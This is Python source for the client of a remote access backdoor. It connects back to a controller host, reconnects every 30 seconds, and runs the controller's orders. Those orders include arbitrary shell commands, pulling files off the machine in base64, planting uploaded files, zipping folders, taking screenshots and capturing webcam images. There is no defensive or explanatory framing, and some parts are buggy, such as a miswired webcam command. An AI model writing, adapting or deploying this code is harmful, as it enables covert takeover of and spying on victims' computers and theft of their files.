#!/usr/bin/env python3
# standard python libraries
import time
import threading
import subprocess
import base64
import socket
import sys
import os
import zipfile
import json
# non-standard libraries
import mss
import cv2


class Client:
    def __init__(self):
        self.connection = Connection()
        self.exit = False

        while not self.exit:
            request = self.dec_request(self.connection.recv(self.connection.sock))

            if request["cmd"] == "f":
                process = threading.Thread(target=self.cwd, args=(request["mode"], request["path"],))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "c":
                process = threading.Thread(target=self.execute_command, args=(request["exe"],))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "d":
                self.download_file(request["open_path"])
            elif request["cmd"] == "u":
                self.upload_file(request["save_path"])
            elif request["cmd"] == "s":
                process = threading.Thread(target=self.make_screenshot, args=(request["monitor"], request["save_path"],))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "z":
                process = threading.Thread(target=self.zip_file_or_folder, args=(request["comp_lvl"], request["open_path"], request["save_path"],))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "w":
                process = threading.Thread(target=self.zip_file_or_folder, args=(request["cam_port"], request["save_path"],))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "r":
                process = threading.Thread(target=self.connection.sock.close)
                self.handle_process(process, request["timeout"])
                self.exit = True

    def cwd(self, mode, path):
        response = {"data": str(), "error": str()}
        if mode == "set":
            try:
                os.chdir(path)
            except FileNotFoundError:
                response["error"] = "[-] FileNotFoundError"
            except PermissionError:
                response["error"] = "[-] PermissionError"
        else:
            response["data"] = os.getcwd()
        self.connection.send(self.enc_response(response), self.connection.sock)

    def execute_command(self, command):
        response = {"data": str(), "error": str()}
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            data = process.stdout.read() + process.stderr.read()
            response["data"] = data
        except UnicodeDecodeError:
            response["error"] = "[-] UnicodeDecodeError"
        self.connection.send(self.enc_response(response), self.connection.sock)

    def download_file(self, path):
        response = {"length": str(), "error": str()}
        try:
            with open(path, "rb") as file:
                data = base64.b64encode(file.read()) + self.connection.END_MARKER
        except FileNotFoundError:
            response["error"] = "[-] FileNotFoundError"
        except PermissionError:
            response["error"] = "[-] PermissionError"
        else:
            response["length"] = str(len(data))
            self.connection.send(self.enc_response(response), self.connection.sock)
            self.connection.sock.send(data)

    def upload_file(self, path):
        response = {"error": str()}
        data = self.connection.recv(self.connection.sock)
        try:
            with open(path, "wb") as file:
                file.write(data)
        except PermissionError:
            response["error"] = "[-] PermissionError"
        self.connection.send(self.enc_response(response), self.connection.sock)

    def make_screenshot(self, monitor, path):
        response = {"error": str()}
        try:
            with mss.mss() as sct:
                sct.shot(mon=int(monitor), output=path)
        except mss.exception.ScreenShotError:
            response["error"] = "[-] MonitorDoesNotExist"
        except ValueError:
            response["error"] = "[-] InvalidMonitorIndex"
        except FileNotFoundError:
            response["error"] = "[-] FileNotFoundError"
        self.connection.send(self.enc_response(response), self.connection.sock)

    def zip_file_or_folder(self, compression_level, path_to_open, path_to_save):
        response = {"error": str()}
        try:
            zip_file = zipfile.ZipFile(path_to_save, 'w', zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
            if os.path.isdir(path_to_open):
                relative_path = os.path.dirname(path_to_open)
                for root, dirs, files in os.walk(path_to_open):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(path_to_open, os.path.basename(path_to_open))
            zip_file.close()
        except PermissionError:
            response["error"] = "[-] PermissionError"
        except FileNotFoundError:
            response["error"] = "[-] FileNotFoundError"
        self.connection.send(self.enc_response(response), self.connection.sock)

    def capture_camera_picture(self, camera_port, path_to_save):
        response = {"error": str()}
        video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
        if not video_capture.isOpened():
            response["error"] = "[-] CouldNotOpenDevice"
            return
        success, frame = video_capture.read()
        if not success:
            response["error"] = "[-] UnableToCapturePicture"
        video_capture.release()
        cv2.destroyAllWindows()
        cv2.imwrite(path_to_save, frame)
        self.connection.send(self.enc_response(response), self.connection.sock)

    def handle_process(self, process, timeout):
        process.start()
        process.join(timeout)
        if process.is_alive():
            self.response["error"] = "[-] TimeoutExpired"

    def dec_request(self, request):
        return json.loads(request.decode(self.connection.CODEC))

    def enc_response(self, response):
        return json.dumps(response).encode(self.connection.CODEC)


class Connection:
    def __init__(self):
        self.CODEC = "utf-8"
        self.END_MARKER = "-".encode(self.CODEC)
        self.PACKET_SIZE = 1024

        HOST = "127.0.0.1"
        PORT = 10000

        if len(sys.argv) == 3:
            try:
                HOST = str(sys.argv[1])
                PORT = int(sys.argv[2])
            except ValueError:
                print("[-] InvalidCommandlineArguments")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                self.sock.connect((HOST, PORT))
                break
            except socket.error:
                time.sleep(30)

    def send(self, data, connection):
        data = base64.b64encode(data) + self.END_MARKER
        connection.send(data)

    def recv(self, connection):
        data = bytes()
        while not data.endswith(self.END_MARKER):
            data += connection.recv(self.PACKET_SIZE)
        return base64.b64decode(data[:-1])


if __name__ == "__main__":
    while True:
        #try:
        client = Client()
            #if client.exit:
                #break
        #except:
            #pass
